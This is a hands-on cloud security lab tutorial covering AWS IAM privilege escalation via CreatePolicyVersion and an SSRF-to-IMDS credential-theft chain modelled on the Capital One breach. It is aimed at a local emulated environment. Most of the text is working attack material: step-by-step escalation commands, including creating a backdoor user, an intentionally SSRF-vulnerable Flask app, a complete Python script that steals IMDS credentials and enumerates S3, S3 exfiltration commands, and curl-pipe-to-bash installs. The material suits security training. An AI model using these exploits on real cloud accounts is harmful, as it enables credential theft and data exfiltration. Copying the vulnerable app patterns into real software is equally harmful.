# Tutorial: Cloud Provider Security (AWS, GCP, Azure) — Hands-On Lab

> **Source document:** domain10_chapter10A_cloud_providers.md
> **Domain 10, Chapter 10A — Lab Exercises**
> **Scope:** AWS IAM privilege escalation / IMDS exploitation / S3 exfiltration / Lambda abuse / STS token manipulation / CloudTrail evasion · GCP service account impersonation / metadata server exploitation / GKE Workload Identity bypass / Firebase misconfiguration · Azure Entra ID attacks / managed identity abuse / Key Vault extraction / Automation Account exploitation / Conditional Access bypass · Identity federation attacks (Golden SAML, OIDC abuse) · Serverless cross-provider attacks · Cloud detection engineering (Sigma, CloudWatch, Azure Monitor, GCP Cloud Monitoring) · Cloud forensics and incident response · Multi-cloud assessment tooling (Pacu, ScoutSuite, Prowler, CloudFox, MicroBurst, ROADtools)

---

## Lab Environment Setup

### Architecture Overview

This lab uses a combination of LocalStack (AWS emulation), simulated GCP/Azure environments via Docker containers, and real CLI tooling configured for local endpoints. For exercises requiring real cloud access, an isolated sandbox account is mandatory.

```
┌─────────────────────────────────────────────────────────┐
│                    LAB NETWORK (172.20.0.0/16)          │
│                                                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │  localstack   │  │  gcp-sim     │  │  azure-sim   │  │
│  │  172.20.1.10  │  │  172.20.2.10 │  │  172.20.3.10 │  │
│  │  AWS emulation│  │  Metadata    │  │  Metadata    │  │
│  │  S3/IAM/STS   │  │  + GCS sim   │  │  + Blob sim  │  │
│  │  Lambda/CT    │  │  + IAM sim   │  │  + IMDS sim  │  │
│  └──────────────┘  └──────────────┘  └──────────────┘  │
│                                                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │  attacker     │  │  victim-web  │  │  detection   │  │
│  │  172.20.0.5   │  │  172.20.0.10 │  │  172.20.0.20 │  │
│  │  Pacu,Prowler │  │  Flask SSRF  │  │  ELK + Sigma │  │
│  │  CloudFox     │  │  vuln app    │  │  alerting    │  │
│  │  ScoutSuite   │  │  IMDSv1      │  │  dashboards  │  │
│  └──────────────┘  └──────────────┘  └──────────────┘  │
│                                                          │
│  ┌──────────────┐  ┌──────────────┐                     │
│  │  forensic     │  │  ci-cd-sim   │                     │
│  │  172.20.0.30  │  │  172.20.0.40 │                     │
│  │  Evidence     │  │  GitHub OIDC │                     │
│  │  collection   │  │  Pipeline    │                     │
│  │  IR tools     │  │  simulation  │                     │
│  └──────────────┘  └──────────────┘                     │
└─────────────────────────────────────────────────────────┘
```

### Docker Compose Lab Environment

```yaml
# docker-compose.yml
version: '3.9'

networks:
  cloud-lab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16

services:
  localstack:
    image: localstack/localstack:3.5
    container_name: localstack
    hostname: localstack
    networks:
      cloud-lab:
        ipv4_address: 172.20.1.10
    ports:
      - "4566:4566"
      - "4510-4559:4510-4559"
    environment:
      - SERVICES=iam,sts,s3,lambda,cloudtrail,ec2,kms,sqs,sns,logs,events,organizations
      - DEFAULT_REGION=us-east-1
      - LAMBDA_EXECUTOR=docker
      - DOCKER_HOST=unix:///var/run/docker.sock
      - DEBUG=1
      - PERSISTENCE=1
    volumes:
      - "/var/run/docker.sock:/var/run/docker.sock"
      - "./localstack-data:/var/lib/localstack"
      - "/tmp/localstack:/tmp/localstack"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:4566/_localstack/health"]
      interval: 10s
      timeout: 5s
      retries: 5

  victim-web:
    build:
      context: ./victim-web
      dockerfile: Dockerfile
    container_name: victim-web
    hostname: victim-web
    networks:
      cloud-lab:
        ipv4_address: 172.20.0.10
    ports:
      - "8080:8080"
    environment:
      - AWS_DEFAULT_REGION=us-east-1
      - AWS_ENDPOINT_URL=http://localstack:4566
      - IMDS_ENDPOINT=http://172.20.1.10:4566  # Simulated IMDS
      - FLASK_ENV=development
    depends_on:
      localstack:
        condition: service_healthy

  attacker:
    build:
      context: ./attacker
      dockerfile: Dockerfile
    container_name: attacker
    hostname: attacker
    networks:
      cloud-lab:
        ipv4_address: 172.20.0.5
    environment:
      - AWS_ENDPOINT_URL=http://localstack:4566
      - AWS_DEFAULT_REGION=us-east-1
      - AWS_ACCESS_KEY_ID=AKIAIOSFODNN7ATTACKER
      - AWS_SECRET_ACCESS_KEY=attacker-secret-key-for-lab
    volumes:
      - "./tools:/opt/tools"
      - "./scripts:/opt/scripts"
    depends_on:
      localstack:
        condition: service_healthy
    stdin_open: true
    tty: true

  detection:
    build:
      context: ./detection
      dockerfile: Dockerfile
    container_name: detection
    hostname: detection
    networks:
      cloud-lab:
        ipv4_address: 172.20.0.20
    ports:
      - "5601:5601"    # Kibana
      - "9200:9200"    # Elasticsearch
      - "5044:5044"    # Logstash
    volumes:
      - "./detection/sigma-rules:/opt/sigma-rules"
      - "./detection/config:/opt/config"
      - "elk-data:/usr/share/elasticsearch/data"
    environment:
      - ELASTICSEARCH_HOSTS=http://localhost:9200
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms1g -Xmx1g"

  forensic:
    build:
      context: ./forensic
      dockerfile: Dockerfile
    container_name: forensic
    hostname: forensic
    networks:
      cloud-lab:
        ipv4_address: 172.20.0.30
    volumes:
      - "./evidence:/opt/evidence"
      - "./forensic/scripts:/opt/scripts"
    depends_on:
      - detection

  ci-cd-sim:
    build:
      context: ./ci-cd-sim
      dockerfile: Dockerfile
    container_name: ci-cd-sim
    hostname: ci-cd-sim
    networks:
      cloud-lab:
        ipv4_address: 172.20.0.40
    ports:
      - "8443:8443"
    environment:
      - OIDC_ISSUER=http://ci-cd-sim:8443
      - AWS_ENDPOINT_URL=http://localstack:4566

volumes:
  elk-data:
```

### Attacker Container Dockerfile

```dockerfile
# attacker/Dockerfile
FROM python:3.12-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    curl jq git unzip dnsutils nmap netcat-openbsd \
    awscli groff less \
    && rm -rf /var/lib/apt/lists/*

RUN pip install --no-cache-dir \
    pacu \
    scoutsuite \
    prowler \
    cloudfox \
    checkov \
    boto3 \
    requests \
    pyjwt \
    cryptography \
    rich \
    httpx

RUN git clone --depth 1 https://github.com/prowler-cloud/prowler /opt/prowler 2>/dev/null || true
RUN git clone --depth 1 https://github.com/RhinoSecurityLabs/pacu /opt/pacu 2>/dev/null || true

WORKDIR /opt/scripts
COPY scripts/ /opt/scripts/

CMD ["bash"]
```

### Victim Web Application (SSRF-vulnerable)

```dockerfile
# victim-web/Dockerfile
FROM python:3.12-slim

RUN pip install --no-cache-dir flask requests boto3
COPY app.py /app/app.py
WORKDIR /app
EXPOSE 8080
CMD ["python", "app.py"]
```

```python
# victim-web/app.py
"""
Intentionally vulnerable web application for SSRF-to-IMDS lab.
DO NOT deploy outside isolated lab environments.
"""
import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)
IMDS_ENDPOINT = os.environ.get("IMDS_ENDPOINT", "http://169.254.169.254")

@app.route("/")
def index():
    return "<h1>Cloud App v2.1</h1><p>Internal proxy service</p>"

@app.route("/api/fetch")
def fetch_url():
    """Intentionally vulnerable: no SSRF protection."""
    url = request.args.get("url")
    if not url:
        return jsonify({"error": "url parameter required"}), 400
    try:
        resp = requests.get(url, timeout=5)
        return jsonify({
            "status": resp.status_code,
            "body": resp.text[:10000],
            "headers": dict(resp.headers)
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/webhook")
def webhook():
    """Simulates a webhook processor that follows redirects."""
    callback_url = request.args.get("callback")
    if not callback_url:
        return jsonify({"error": "callback parameter required"}), 400
    try:
        resp = requests.get(callback_url, allow_redirects=True, timeout=5)
        return jsonify({"status": "processed", "response_code": resp.status_code})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/health")
def health():
    return jsonify({"status": "healthy"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
```

### LocalStack Bootstrap Script

```bash
#!/bin/bash
# setup/bootstrap-localstack.sh
# Provisions vulnerable AWS resources in LocalStack for lab exercises

set -euo pipefail
export AWS_ENDPOINT_URL=http://localhost:4566
export AWS_DEFAULT_REGION=us-east-1
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test

echo "[*] Creating IAM users, roles, and policies..."

# Admin role with overly broad trust policy
aws iam create-role --role-name AdminRole \
  --assume-role-policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Allow",
      "Principal":{"AWS":"*"},
      "Action":"sts:AssumeRole"
    }]
  }'

aws iam attach-role-policy --role-name AdminRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Low-privilege attacker user with dangerous IAM permissions
aws iam create-user --user-name attacker-user
aws iam create-access-key --user-name attacker-user > /tmp/attacker-keys.json

# Policy with iam:CreatePolicyVersion (privilege escalation vector)
aws iam create-policy --policy-name SomePolicy \
  --policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Allow",
      "Action":["s3:GetObject","s3:ListBucket"],
      "Resource":"*"
    }]
  }'

aws iam put-user-policy --user-name attacker-user --policy-name EscalationPath \
  --policy-document '{
    "Version":"2012-10-17",
    "Statement":[
      {
        "Effect":"Allow",
        "Action":["iam:CreatePolicyVersion","iam:SetDefaultPolicyVersion","iam:ListPolicies","iam:GetPolicy","iam:GetPolicyVersion","iam:ListPolicyVersions"],
        "Resource":"*"
      },
      {
        "Effect":"Allow",
        "Action":["iam:PassRole","lambda:CreateFunction","lambda:InvokeFunction","lambda:ListFunctions"],
        "Resource":"*"
      },
      {
        "Effect":"Allow",
        "Action":["sts:AssumeRole","sts:GetCallerIdentity"],
        "Resource":"*"
      },
      {
        "Effect":"Allow",
        "Action":["s3:ListAllMyBuckets","s3:GetBucketLocation"],
        "Resource":"*"
      }
    ]
  }'

# EC2 web role (overprivileged — simulates Capital One scenario)
aws iam create-role --role-name EC2-WebAppRole \
  --assume-role-policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Allow",
      "Principal":{"Service":"ec2.amazonaws.com"},
      "Action":"sts:AssumeRole"
    }]
  }'

aws iam put-role-policy --role-name EC2-WebAppRole --policy-name BroadS3Access \
  --policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Allow",
      "Action":["s3:GetObject","s3:ListBucket","s3:PutObject"],
      "Resource":"*"
    }]
  }'

# Lambda execution role
aws iam create-role --role-name LambdaAdminRole \
  --assume-role-policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Allow",
      "Principal":{"Service":"lambda.amazonaws.com"},
      "Action":"sts:AssumeRole"
    }]
  }'

aws iam attach-role-policy --role-name LambdaAdminRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "[*] Creating S3 buckets with sensitive data..."

# Sensitive buckets (simulating a real environment)
for bucket in company-data-prod company-backup-2024 company-logs-internal company-customer-pii; do
  aws s3 mb s3://$bucket
done

# Populate with fake sensitive data
echo '{"ssn":"123-45-6789","name":"John Doe","credit_score":750}' | \
  aws s3 cp - s3://company-customer-pii/records/customer_001.json
echo '{"ssn":"987-65-4321","name":"Jane Smith","credit_score":680}' | \
  aws s3 cp - s3://company-customer-pii/records/customer_002.json
echo '{"db_password":"SuperSecret123!","api_key":"sk-live-abc123"}' | \
  aws s3 cp - s3://company-backup-2024/configs/secrets.json
echo 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE' | \
  aws s3 cp - s3://company-backup-2024/configs/.env

# Public bucket (misconfigured)
aws s3 mb s3://company-public-assets
aws s3api put-bucket-policy --bucket company-public-assets \
  --policy '{
    "Version":"2012-10-17",
    "Statement":[{
      "Sid":"PublicRead",
      "Effect":"Allow",
      "Principal":"*",
      "Action":"s3:GetObject",
      "Resource":"arn:aws:s3:::company-public-assets/*"
    }]
  }'

echo "[*] Creating CloudTrail trail..."
aws s3 mb s3://cloudtrail-logs-lab
aws cloudtrail create-trail \
  --name lab-trail \
  --s3-bucket-name cloudtrail-logs-lab \
  --is-multi-region-trail
aws cloudtrail start-logging --name lab-trail

echo "[*] Creating KMS key..."
aws kms create-key --description "Lab encryption key" \
  --key-usage ENCRYPT_DECRYPT --origin AWS_KMS

echo "[*] Creating SQS queues and SNS topics..."
aws sqs create-queue --queue-name security-alerts
aws sns create-topic --name security-notifications

echo "[*] Bootstrap complete. Lab environment ready."
cat /tmp/attacker-keys.json
```

### Tool Installation (for real cloud testing)

```bash
#!/bin/bash
# setup/install-tools.sh
# Install cloud security assessment tools on the attacker workstation

set -euo pipefail

echo "[*] Installing AWS CLI v2..."
curl -fsSL "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o /tmp/awscliv2.zip
unzip -qo /tmp/awscliv2.zip -d /tmp/aws-install
sudo /tmp/aws-install/aws/install --update
rm -rf /tmp/awscliv2.zip /tmp/aws-install

echo "[*] Installing Azure CLI..."
curl -fsSL https://aka.ms/InstallAzureCLIDeb | sudo bash

echo "[*] Installing Google Cloud SDK..."
curl -fsSL https://sdk.cloud.google.com | bash -s -- --disable-prompts
source ~/google-cloud-sdk/path.bash.inc

echo "[*] Installing Python tools..."
pip install --user \
  pacu \
  scoutsuite \
  prowler \
  checkov \
  cloudfox \
  boto3 \
  azure-cli-core \
  google-auth \
  httpx \
  rich \
  pyjwt[crypto]

echo "[*] Installing Go tools..."
go install github.com/BishopFox/cloudfox@latest

echo "[*] Installing ROADtools (Azure AD)..."
pip install --user roadtools roadlib roadrecon

echo "[*] Installing AADInternals (requires PowerShell)..."
if command -v pwsh &>/dev/null; then
  pwsh -Command "Install-Module AADInternals -Force -Scope CurrentUser"
fi

echo "[*] Installing MicroBurst (Azure)..."
if command -v pwsh &>/dev/null; then
  pwsh -Command "Install-Module MicroBurst -Force -Scope CurrentUser"
fi

echo "[*] Installing trivy (IaC + container scanning)..."
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | \
  sudo sh -s -- -b /usr/local/bin

echo "[*] Tool installation complete."
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: AWS IAM Privilege Escalation — CreatePolicyVersion Path

**Objective:** Starting from a low-privilege IAM user with `iam:CreatePolicyVersion`, escalate to full administrative access by modifying an existing managed policy.

**Background:** This is one of 21+ IAM privilege escalation paths documented by Rhino Security Labs. The attacker modifies a policy already attached to their user (or any principal they share a policy with) by creating a new policy version with wildcard permissions and setting it as the default.

**Step 1 — Enumerate current permissions:**

```bash
# Verify initial identity
aws sts get-caller-identity --endpoint-url http://localhost:4566

# List policies attached to the current user
aws iam list-attached-user-policies --user-name attacker-user \
  --endpoint-url http://localhost:4566

# List inline policies
aws iam list-user-policies --user-name attacker-user \
  --endpoint-url http://localhost:4566

# Enumerate all customer-managed policies in the account
aws iam list-policies --scope Local \
  --query 'Policies[*].[PolicyName,Arn,DefaultVersionId]' \
  --output table --endpoint-url http://localhost:4566
```

**Expected output:** The attacker sees their `EscalationPath` inline policy and a `SomePolicy` managed policy. The inline policy grants `iam:CreatePolicyVersion` on all resources.

**Step 2 — Identify the escalation vector:**

```bash
# Get the current policy document for SomePolicy
POLICY_ARN=$(aws iam list-policies --scope Local \
  --query 'Policies[?PolicyName==`SomePolicy`].Arn' \
  --output text --endpoint-url http://localhost:4566)

aws iam get-policy-version --policy-arn "$POLICY_ARN" \
  --version-id v1 --endpoint-url http://localhost:4566

# Current permissions: only s3:GetObject and s3:ListBucket
```

**Step 3 — Create a new policy version with admin permissions:**

```bash
# Create a new version that grants full admin access
aws iam create-policy-version \
  --policy-arn "$POLICY_ARN" \
  --policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Allow",
      "Action":"*",
      "Resource":"*"
    }]
  }' \
  --set-as-default \
  --endpoint-url http://localhost:4566

# Verify the new default version
aws iam get-policy --policy-arn "$POLICY_ARN" \
  --query 'Policy.DefaultVersionId' \
  --endpoint-url http://localhost:4566
# Expected: v2
```

**Step 4 — Verify escalated permissions:**

```bash
# Attach the now-admin policy to the attacker user
aws iam attach-user-policy --user-name attacker-user \
  --policy-arn "$POLICY_ARN" --endpoint-url http://localhost:4566

# Test admin actions that were previously denied
aws iam list-users --endpoint-url http://localhost:4566
aws s3 ls --endpoint-url http://localhost:4566
aws iam create-user --user-name backdoor-user --endpoint-url http://localhost:4566
aws iam create-access-key --user-name backdoor-user --endpoint-url http://localhost:4566
```

**Step 5 — Automated enumeration with Pacu:**

```python
#!/usr/bin/env python3
"""
scripts/iam_privesc_scanner.py
Automated IAM privilege escalation scanner.
Identifies exploitable IAM permission combinations.
"""
import boto3
import json
from typing import Optional

PRIVESC_PERMISSIONS = {
    "CreatePolicyVersion": {
        "required": ["iam:CreatePolicyVersion"],
        "description": "Create new policy version with admin permissions",
        "risk": "CRITICAL"
    },
    "SetDefaultPolicyVersion": {
        "required": ["iam:SetDefaultPolicyVersion"],
        "description": "Switch to a more permissive historical policy version",
        "risk": "HIGH"
    },
    "AttachUserPolicy": {
        "required": ["iam:AttachUserPolicy"],
        "description": "Attach AdministratorAccess to attacker user",
        "risk": "CRITICAL"
    },
    "AttachRolePolicy": {
        "required": ["iam:AttachRolePolicy"],
        "description": "Attach AdministratorAccess to any role",
        "risk": "CRITICAL"
    },
    "PutUserPolicy": {
        "required": ["iam:PutUserPolicy"],
        "description": "Create inline admin policy on attacker user",
        "risk": "CRITICAL"
    },
    "PassRole_Lambda": {
        "required": ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
        "description": "Create Lambda with admin role and invoke it",
        "risk": "CRITICAL"
    },
    "PassRole_EC2": {
        "required": ["iam:PassRole", "ec2:RunInstances"],
        "description": "Launch EC2 with admin instance profile",
        "risk": "CRITICAL"
    },
    "CreateLoginProfile": {
        "required": ["iam:CreateLoginProfile"],
        "description": "Create console password for another IAM user",
        "risk": "HIGH"
    },
    "CreateAccessKey": {
        "required": ["iam:CreateAccessKey"],
        "description": "Generate access key for another IAM user",
        "risk": "HIGH"
    },
    "UpdateAssumeRolePolicy": {
        "required": ["iam:UpdateAssumeRolePolicy"],
        "description": "Modify role trust to allow attacker assumption",
        "risk": "CRITICAL"
    },
    "AssumeRole_Wildcard": {
        "required": ["sts:AssumeRole"],
        "description": "Assume roles with broad trust policies",
        "risk": "HIGH"
    }
}


class IAMPrivescScanner:
    def __init__(self, endpoint_url: Optional[str] = None):
        kwargs = {}
        if endpoint_url:
            kwargs["endpoint_url"] = endpoint_url
        self.iam = boto3.client("iam", **kwargs)
        self.sts = boto3.client("sts", **kwargs)

    def get_caller_identity(self) -> dict:
        return self.sts.get_caller_identity()

    def enumerate_user_permissions(self, username: str) -> set:
        """Collect all actions the user is allowed to perform."""
        actions = set()

        # Inline policies
        try:
            inline = self.iam.list_user_policies(UserName=username)
            for policy_name in inline.get("PolicyNames", []):
                doc = self.iam.get_user_policy(
                    UserName=username, PolicyName=policy_name
                )["PolicyDocument"]
                actions.update(self._extract_actions(doc))
        except Exception:
            pass

        # Attached managed policies
        try:
            attached = self.iam.list_attached_user_policies(UserName=username)
            for policy in attached.get("AttachedPolicies", []):
                arn = policy["PolicyArn"]
                version = self.iam.get_policy(PolicyArn=arn)["Policy"]["DefaultVersionId"]
                doc = self.iam.get_policy_version(
                    PolicyArn=arn, VersionId=version
                )["PolicyVersion"]["Document"]
                actions.update(self._extract_actions(doc))
        except Exception:
            pass

        # Group policies
        try:
            groups = self.iam.list_groups_for_user(UserName=username)
            for group in groups.get("Groups", []):
                gname = group["GroupName"]
                # Inline group policies
                ginline = self.iam.list_group_policies(GroupName=gname)
                for pname in ginline.get("PolicyNames", []):
                    doc = self.iam.get_group_policy(
                        GroupName=gname, PolicyName=pname
                    )["PolicyDocument"]
                    actions.update(self._extract_actions(doc))
                # Attached group policies
                gattached = self.iam.list_attached_group_policies(GroupName=gname)
                for policy in gattached.get("AttachedPolicies", []):
                    arn = policy["PolicyArn"]
                    version = self.iam.get_policy(PolicyArn=arn)["Policy"]["DefaultVersionId"]
                    doc = self.iam.get_policy_version(
                        PolicyArn=arn, VersionId=version
                    )["PolicyVersion"]["Document"]
                    actions.update(self._extract_actions(doc))
        except Exception:
            pass

        return actions

    def _extract_actions(self, policy_doc: dict) -> set:
        """Extract all allowed actions from a policy document."""
        actions = set()
        if isinstance(policy_doc, str):
            policy_doc = json.loads(policy_doc)
        for stmt in policy_doc.get("Statement", []):
            if stmt.get("Effect") == "Allow":
                action = stmt.get("Action", [])
                if isinstance(action, str):
                    action = [action]
                actions.update(action)
        return actions

    def check_assumable_roles(self) -> list:
        """Find roles with overly permissive trust policies."""
        vulnerable_roles = []
        try:
            roles = self.iam.list_roles()
            for role in roles.get("Roles", []):
                trust = role.get("AssumeRolePolicyDocument", {})
                if isinstance(trust, str):
                    trust = json.loads(trust)
                for stmt in trust.get("Statement", []):
                    principal = stmt.get("Principal", {})
                    if principal == "*" or principal == {"AWS": "*"}:
                        vulnerable_roles.append({
                            "RoleName": role["RoleName"],
                            "Arn": role["Arn"],
                            "Issue": "Wildcard principal — any account can assume",
                            "Risk": "CRITICAL"
                        })
                    elif isinstance(principal, dict):
                        for key, val in principal.items():
                            if isinstance(val, str) and val.endswith(":root"):
                                # Cross-account trust
                                conditions = stmt.get("Condition", {})
                                if "StringEquals" not in conditions or \
                                   "sts:ExternalId" not in conditions.get("StringEquals", {}):
                                    vulnerable_roles.append({
                                        "RoleName": role["RoleName"],
                                        "Arn": role["Arn"],
                                        "Issue": f"Cross-account trust to {val} without ExternalId",
                                        "Risk": "HIGH"
                                    })
        except Exception:
            pass
        return vulnerable_roles

    def scan(self, username: str) -> dict:
        """Run full privilege escalation scan."""
        identity = self.get_caller_identity()
        permissions = self.enumerate_user_permissions(username)
        assumable_roles = self.check_assumable_roles()

        exploitable = []
        for path_name, path_info in PRIVESC_PERMISSIONS.items():
            required = path_info["required"]
            # Check if user has all required permissions (exact or wildcard)
            has_all = True
            for req in required:
                service, action = req.split(":", 1)
                matched = False
                for perm in permissions:
                    if perm == "*" or perm == f"{service}:*" or perm == req:
                        matched = True
                        break
                    if "*" in perm:
                        import fnmatch
                        if fnmatch.fnmatch(req, perm):
                            matched = True
                            break
                if not matched:
                    has_all = False
                    break
            if has_all:
                exploitable.append({
                    "path": path_name,
                    "risk": path_info["risk"],
                    "description": path_info["description"],
                    "required_permissions": required
                })

        return {
            "identity": identity,
            "permissions_found": sorted(permissions),
            "exploitable_paths": exploitable,
            "assumable_roles": assumable_roles,
            "total_privesc_vectors": len(exploitable)
        }


if __name__ == "__main__":
    import sys
    endpoint = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4566"
    scanner = IAMPrivescScanner(endpoint_url=endpoint)

    identity = scanner.get_caller_identity()
    # Extract username from ARN
    arn = identity["Arn"]
    username = arn.split("/")[-1] if "/" in arn else "attacker-user"

    results = scanner.scan(username)
    print(json.dumps(results, indent=2, default=str))
```

**Verification:** The scanner identifies `CreatePolicyVersion` and `PassRole_Lambda` as exploitable paths. The attacker confirms admin access by successfully creating a new IAM user.

---

### Exercise 2: SSRF to IMDS Credential Theft (Capital One Attack Chain)

**Objective:** Exploit the SSRF-vulnerable web application to steal IAM role credentials from the Instance Metadata Service, then use those credentials to exfiltrate data from S3 buckets.

**Background:** This reproduces the Capital One breach attack chain (2019): SSRF → IMDSv1 → credential theft → S3 data exfiltration.

**Step 1 — Discover the SSRF vulnerability:**

```bash
# Test the vulnerable /api/fetch endpoint
curl -s "http://localhost:8080/api/fetch?url=http://example.com" | jq .

# Confirm it follows URLs without validation
curl -s "http://localhost:8080/api/fetch?url=http://localstack:4566/_localstack/health" | jq .
```

**Step 2 — Exploit SSRF to reach IMDS (IMDSv1 simulation):**

```bash
# Step 2a: Discover the IAM role name via IMDS
curl -s "http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | jq -r '.body'
# Expected: EC2-WebAppRole

# Step 2b: Retrieve the role's temporary credentials
curl -s "http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-WebAppRole" | jq '.body | fromjson'
# Expected: AccessKeyId, SecretAccessKey, Token, Expiration

# Step 2c: Extract additional metadata
curl -s "http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/instance-id" | jq -r '.body'
curl -s "http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/placement/availability-zone" | jq -r '.body'
curl -s "http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/user-data" | jq -r '.body'
```

**Step 3 — Use stolen credentials for S3 enumeration and exfiltration:**

```bash
# Set stolen credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Verify the stolen identity
aws sts get-caller-identity --endpoint-url http://localhost:4566
# Shows EC2-WebAppRole

# Enumerate S3 buckets
aws s3 ls --endpoint-url http://localhost:4566

# List contents of sensitive buckets
aws s3 ls s3://company-customer-pii/ --recursive --endpoint-url http://localhost:4566
aws s3 ls s3://company-backup-2024/ --recursive --endpoint-url http://localhost:4566

# Exfiltrate data
mkdir -p /tmp/exfil
aws s3 sync s3://company-customer-pii/ /tmp/exfil/pii/ --endpoint-url http://localhost:4566
aws s3 sync s3://company-backup-2024/ /tmp/exfil/backups/ --endpoint-url http://localhost:4566

# Check for credentials in backups
cat /tmp/exfil/backups/configs/secrets.json
cat /tmp/exfil/backups/configs/.env
```

**Step 4 — Automated SSRF-to-IMDS exploitation script:**

```python
#!/usr/bin/env python3
"""
scripts/ssrf_imds_exploit.py
Automated SSRF-to-IMDS exploitation chain.
Authorized testing context only.
"""
import json
import sys
import httpx
import boto3
from urllib.parse import quote

IMDS_BASE = "http://169.254.169.254/latest"

METADATA_PATHS = [
    "/meta-data/instance-id",
    "/meta-data/ami-id",
    "/meta-data/hostname",
    "/meta-data/local-ipv4",
    "/meta-data/public-ipv4",
    "/meta-data/placement/availability-zone",
    "/meta-data/placement/region",
    "/meta-data/iam/security-credentials/",
    "/meta-data/network/interfaces/macs/",
    "/user-data",
    "/dynamic/instance-identity/document",
]


class SSRFIMDSExploit:
    def __init__(self, target_url: str, ssrf_param: str = "url"):
        self.target = target_url
        self.param = ssrf_param
        self.client = httpx.Client(timeout=10)
        self.creds = None

    def fetch_via_ssrf(self, internal_url: str) -> str:
        """Use SSRF to fetch an internal URL."""
        resp = self.client.get(
            self.target,
            params={self.param: internal_url}
        )
        data = resp.json()
        return data.get("body", "")

    def enumerate_metadata(self) -> dict:
        """Enumerate all accessible IMDS metadata."""
        metadata = {}
        for path in METADATA_PATHS:
            try:
                body = self.fetch_via_ssrf(f"{IMDS_BASE}{path}")
                if body:
                    metadata[path] = body
            except Exception:
                continue
        return metadata

    def steal_credentials(self) -> dict:
        """Steal IAM role credentials from IMDS."""
        # Get role name
        roles_raw = self.fetch_via_ssrf(
            f"{IMDS_BASE}/meta-data/iam/security-credentials/"
        )
        if not roles_raw:
            return {"error": "No IAM role found on instance"}

        role_name = roles_raw.strip().split("\n")[0]

        # Get credentials
        creds_raw = self.fetch_via_ssrf(
            f"{IMDS_BASE}/meta-data/iam/security-credentials/{role_name}"
        )
        try:
            self.creds = json.loads(creds_raw)
        except (json.JSONDecodeError, TypeError):
            return {"error": "Failed to parse credentials", "raw": creds_raw}

        return {
            "role_name": role_name,
            "access_key_id": self.creds.get("AccessKeyId"),
            "secret_access_key": self.creds.get("SecretAccessKey"),
            "session_token": self.creds.get("Token"),
            "expiration": self.creds.get("Expiration"),
        }

    def enumerate_s3_with_stolen_creds(self, endpoint_url: str = None) -> list:
        """Use stolen credentials to enumerate S3 buckets."""
        if not self.creds:
            return []

        kwargs = {}
        if endpoint_url:
            kwargs["endpoint_url"] = endpoint_url

        s3 = boto3.client(
            "s3",
            aws_access_key_id=self.creds["AccessKeyId"],
            aws_secret_access_key=self.creds["SecretAccessKey"],
            aws_session_token=self.creds.get("Token"),
            **kwargs
        )

        buckets = []
        try:
            response = s3.list_buckets()
            for bucket in response.get("Buckets", []):
                name = bucket["Name"]
                objects = []
                try:
                    obj_resp = s3.list_objects_v2(Bucket=name, MaxKeys=20)
                    for obj in obj_resp.get("Contents", []):
                        objects.append({
                            "key": obj["Key"],
                            "size": obj["Size"],
                            "last_modified": str(obj["LastModified"])
                        })
                except Exception:
                    pass
                buckets.append({
                    "name": name,
                    "creation_date": str(bucket["CreationDate"]),
                    "objects_sample": objects
                })
        except Exception as e:
            return [{"error": str(e)}]

        return buckets

    def check_imdsv2(self) -> dict:
        """Check if IMDSv2 is enforced (token-based)."""
        # Try IMDSv1 (simple GET)
        v1_result = self.fetch_via_ssrf(
            f"{IMDS_BASE}/meta-data/instance-id"
        )

        # IMDSv2 requires PUT with header — most SSRF can't do this
        return {
            "imdsv1_accessible": bool(v1_result),
            "instance_id_v1": v1_result if v1_result else None,
            "note": "IMDSv2 requires PUT+header which most SSRF cannot perform"
        }

    def full_exploit(self, endpoint_url: str = None) -> dict:
        """Run full SSRF-to-IMDS-to-S3 attack chain."""
        results = {
            "phase_1_imds_check": self.check_imdsv2(),
            "phase_2_metadata": self.enumerate_metadata(),
            "phase_3_credentials": self.steal_credentials(),
            "phase_4_s3_enum": self.enumerate_s3_with_stolen_creds(endpoint_url)
        }

        results["attack_chain_complete"] = bool(self.creds)
        return results


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080/api/fetch"
    endpoint = sys.argv[2] if len(sys.argv) > 2 else "http://localhost:4566"

    exploit = SSRFIMDSExploit(target)
    results = exploit.full_exploit(endpoint_url=endpoint)
    print(json.dumps(results, indent=2, default=str))
```

**Verification:** The script successfully chains SSRF → IMDS → credential theft → S3 enumeration, demonstrating the full Capital One attack path.

---

